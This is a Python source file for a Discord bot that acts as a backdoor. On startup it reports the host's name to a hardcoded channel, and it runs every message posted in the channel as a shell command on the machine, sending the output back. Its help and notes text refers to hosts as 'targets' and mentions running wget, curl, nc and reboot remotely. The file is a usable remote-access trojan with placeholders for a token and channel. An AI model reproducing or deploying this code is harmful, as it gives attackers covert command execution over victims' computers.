import discord
from discord.ext import commands
import subprocess as sp
import os ,time
from discord import message
from discord import user


intents = discord.Intents.default()
intents.message_content = True

client = commands.Bot(command_prefix='#', intents=intents)


@client.event
async def on_ready():
    print('Bot is online and ready.')
    #right click on channel general and copy id
    channel = client.get_channel(1038778150903087126)  # copy your channel id https://discord.com/channels/102931------4122751/(1038......3087145)<- this one
    await channel.send(f"{sp.getoutput('hostname')} is online")


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('#help'):
        await message.channel.send("commands : #show targets , #execute host commands , #notes")

    if message.content.startswith('#show targets'):
        try:
            await message.channel.send(sp.getoutput('hostname'))
        except Exception as e:
            pass

    if message.content.startswith('#notes'):

        await message.channel.send(" may be some of commands not show results because of http methods pull request problem with api but all commands do excute on host ex .create file or use wget ,curl , ping, nc,reboot .all commands will be excuted on host  ")
        

    if message.content.startswith('#execute host commands'):
        try:
            await message.channel.send("Use the name of the host and then enter the command to execute on that host."
                                       " For example: ls #hostname, pwd #hostname")
        except Exception as e:
            raise

    host = os.system("hostname")
    if str(host) in message.content:
        try:
            await message.channel.send(sp. getoutput(message.content))
           
        except Exception as e:
            raise
        else:
            await message.channel.send("Use commands properly, view #help")

    if message.content.startswith(message.content):
        try:
            await message.channel.send(sp.getoutput(message.content))
        except Exception as e:
            raise


client.run("YOUR BOT TOKEN HERE")
#replace run(your_bot_token which you added in your discord server)
